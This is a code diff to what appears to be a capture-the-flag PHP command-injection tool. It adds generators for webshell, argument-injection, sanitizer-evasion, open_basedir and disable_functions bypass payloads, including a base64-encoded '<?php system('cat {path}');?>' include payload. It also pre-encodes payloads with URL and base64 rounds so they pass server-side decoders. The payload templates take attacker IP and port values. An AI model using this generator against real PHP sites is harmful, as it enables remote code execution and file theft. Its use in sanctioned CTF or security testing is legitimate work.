@@ -1,7 +1,11 @@
 from dataclasses import dataclass
+from typing import TYPE_CHECKING, Optional
 
 from . import bypass_data
 from . import utils
+
+if TYPE_CHECKING:
+    from .auto import AutoContext
 
 
 @dataclass
@@ -14,6 +18,8 @@ class BypassOptions:
     phpinfo: bool
     php_version: float = 7.0
     upload: bool = False
+    payload_context: str = "any"
+    auto_context: Optional["AutoContext"] = None
 
 
 def _octal_encode(command: str):
@@ -167,6 +173,10 @@ def _is_php_style_payload(payload: str):
     if not stripped:
         return False
 
+    # Shell ANSI-C quoting starts with $'...', which is not valid PHP code.
+    if stripped.startswith("$'") or stripped.startswith('$"'):
+        return False
+
     if _is_upload_wrapper_like_payload(stripped):
         return True
 
@@ -214,6 +224,36 @@ def _is_shell_style_payload(payload: str):
     if _is_upload_wrapper_like_payload(stripped):
         return False
     return not _is_php_style_payload(stripped)
+
+
+def _is_eval_safe_php_payload(payload: str):
+    stripped = payload.strip()
+    if not _is_php_style_payload(stripped):
+        return False
+    if stripped.startswith("`") and stripped.endswith("`"):
+        return False
+    return True
+
+
+def _normalize_payload_context(payload_context: str):
+    normalized = str(payload_context or "any").strip().lower()
+    if normalized in {"php", "php_eval", "php_code", "eval"}:
+        return "php_code"
+    if normalized in {"shell", "shell_cmd", "shell_command", "command"}:
+        return "shell_command"
+    return "any"
+
+
+def _filter_payloads_for_context(payloads, payload_context: str):
+    normalized = _normalize_payload_context(payload_context)
+    if normalized == "any":
+        return utils.dedupe_preserve_order(payloads)
+
+    matcher = _is_eval_safe_php_payload if normalized == "php_code" else _is_shell_style_payload
+    filtered = [payload for payload in payloads if matcher(payload)]
+    if filtered:
+        return utils.dedupe_preserve_order(filtered)
+    return utils.dedupe_preserve_order(payloads)
 
 
 def _apply_upload_php_wrappers(payloads, php_version: float):
@@ -359,6 +399,163 @@ def _append_upload_exec_payloads(payloads):
             payloads.append(wrapper.format(cmd=cmd))
 
 
+def _safe_format(template: str, **values) -> str:
+    """
+    _safe_format("cat {path}; find . -exec echo {} \\;", path="/flag")
+
+    替换为：
+
+    "cat /flag; find . -exec echo {} \\;"
+    """
+    out = template
+    for key, val in values.items():
+        out = out.replace("{" + key + "}", str(val))
+    return out
+
+
+def _render_argument_injection_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or not ctx.fixed_command_prefix:
+        return []
+    prefix = ctx.fixed_command_prefix.lower()
+    templates = bypass_data.AUTO_ARG_INJECT_BY_CMD.get(prefix)
+    if not templates:
+        return []
+    path = options.flagfile or "/flag"
+    rendered = []
+    for tpl in templates:
+        arg = _safe_format(tpl, path=path, ip=options.ip, port=options.port)
+        rendered.append(f"{prefix} {arg}")
+        # Also emit a plain `arg`-only variant in case auto runs with a sink
+        # that already prepends the prefix.
+        rendered.append(arg)
+    return rendered
+
+
+def _render_sanitizer_aware_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or not ctx.sanitizers:
+        return []
+    out = []
+    path = options.flagfile or "/flag"
+    for san in ctx.sanitizers:
+        if san == "escapeshellarg":
+            out.extend(
+                _safe_format(t, path=path, ip=options.ip, port=options.port)
+                for t in bypass_data.AUTO_ESCAPESHELLARG_GADGETS
+            )
+        elif san == "escapeshellcmd":
+            out.extend(bypass_data.AUTO_ESCAPESHELLCMD_GADGETS)
+        elif san == "addslashes":
+            out.extend(_safe_format(t, path=path) for t in bypass_data.AUTO_ADDSLASHES_SAFE)
+        elif san in {"htmlspecialchars", "htmlentities"}:
+            out.extend(
+                _safe_format(t, path=path) for t in bypass_data.AUTO_HTMLSPECIALCHARS_SAFE
+            )
+    return out
+
+
+def _render_precise_webshell_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None:
+        return []
+    out = []
+    path = options.flagfile or "/flag"
+    key = ctx.input_key or "x"
+    if ctx.sink_function in {"eval", "assert"} or (
+        ctx.sink_function == "" and ctx.input_key
+    ):
+        for tpl in bypass_data.AUTO_PRECISE_EVAL_TEMPLATES:
+            out.append(_safe_format(tpl, key=key, path=path))
+    if ctx.sink_function in {"include", "include_once", "require", "require_once"}:
+        b64 = utils.base64_encode(f"<?php system('cat {path}');?>")
+        for tpl in bypass_data.AUTO_PRECISE_INCLUDE_TEMPLATES:
+            out.append(_safe_format(tpl, path=path, b64=b64))
+    return out
+
+
+def _render_file_read_path_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None:
+        return []
+    if ctx.sink_function not in {"file_get_contents", "readfile", "highlight_file", "show_source"}:
+        return []
+    path = options.flagfile or "/flag"
+    return [_safe_format(tpl, path=path) for tpl in bypass_data.AUTO_FILE_READ_PATH_TEMPLATES]
+
+
+def _render_php7_only_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None:
+        return []
+    version = ctx.php_version_hint if ctx.php_version_hint is not None else options.php_version
+    if version is None or version < 7.0:
+        return []
+    path = options.flagfile or "/flag"
+    return [_safe_format(t, path=path) for t in bypass_data.AUTO_PHP7_ONLY]
+
+
+def _render_open_basedir_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or not ctx.open_basedir:
+        return []
+    path = options.flagfile or "/flag"
+    return [_safe_format(t, path=path) for t in bypass_data.AUTO_OPEN_BASEDIR_BYPASS]
+
+
+def _render_disable_fn_payloads(options: "BypassOptions"):
+    ctx = options.auto_context
+    if ctx is None or not ctx.disable_functions:
+        return []
+    disabled = {d.lower() for d in ctx.disable_functions}
+    path = options.flagfile or "/flag"
+    out = []
+    for tpl in bypass_data.AUTO_DISABLE_FN_BYPASS:
+        rendered = _safe_format(tpl, path=path)
+        # Skip templates that use a disabled function.
+        first_call = rendered.split("(")[0].rstrip()
+        first_name = first_call.rsplit(";", 1)[-1].strip().lstrip("$")
+        if first_name.lower() in disabled:
+            continue
+        out.append(rendered)
+    return out
+
+
+def _render_preprocessor_wrapped(options: "BypassOptions", existing):
+    """Apply preprocessor-aware transforms to the existing candidate pool."""
+    ctx = options.auto_context
+    if ctx is None or not ctx.preprocessors:
+        return []
+    out = []
+    pp = [p.lower() for p in ctx.preprocessors]
+    url_rounds = pp.count("urldecode") + pp.count("rawurldecode")
+    wraps_base64 = "base64_decode" in pp
+    for payload in existing:
+        # urldecode round-trip: pre-encode the payload N times so the server
+        # decoder restores it to the original.
+        enc = payload
+        for _ in range(url_rounds):
+            enc = utils.url_encode(enc)
+        if enc != payload:
+            out.append(enc)
+        if wraps_base64:
+            out.append(utils.base64_encode(payload))
+    return out
+
+
+def _generate_auto_only_candidates(options: "BypassOptions", base_candidates):
+    out = []
+    out.extend(_render_argument_injection_payloads(options))
+    out.extend(_render_sanitizer_aware_payloads(options))
+    out.extend(_render_precise_webshell_payloads(options))
+    out.extend(_render_file_read_path_payloads(options))
+    out.extend(_render_php7_only_payloads(options))
+    out.extend(_render_open_basedir_payloads(options))
+    out.extend(_render_disable_fn_payloads(options))
+    out.extend(_render_preprocessor_wrapped(options, base_candidates + out))
+    return out
+
+
 def generate_candidates(options: BypassOptions):
     payloads = []
     target_cmd = None
@@ -374,6 +571,7 @@ def generate_candidates(options: BypassOptions):
         if root_discovery_mode:
             payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
             payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
+            payloads.extend(_render_backtick_payloads("ls /"))
         else:
             target_cmd = f"cat {options.flagfile}"
 
@@ -433,6 +631,7 @@ def generate_candidates(options: BypassOptions):
 
     if target_cmd:
         payloads.append(bypass_data.NON_ALNUM_ASSERT_POST_PAYLOAD)
+        payloads.append(utils.generate_nan_seed_post_gateway())
         if target_cmd == "phpinfo":
             inc_code = utils.generate_php_increment("phpinfo")
             if inc_code:
@@ -466,9 +665,14 @@ def generate_candidates(options: BypassOptions):
         for cmd in simple_cmds:
             payloads.append(_octal_encode(cmd))
 
+    # Auto-only
+    if options.auto_context is not None:
+        auto_only = _generate_auto_only_candidates(options, payloads)
+        payloads.extend(auto_only)
+
     candidates = utils.dedupe_preserve_order(payloads)
     candidates = [payload for payload in candidates if payload != "`/`"]
-    return candidates
+    return _filter_payloads_for_context(candidates, options.payload_context)
 
 
 def apply_encodings(payloads, strategies):
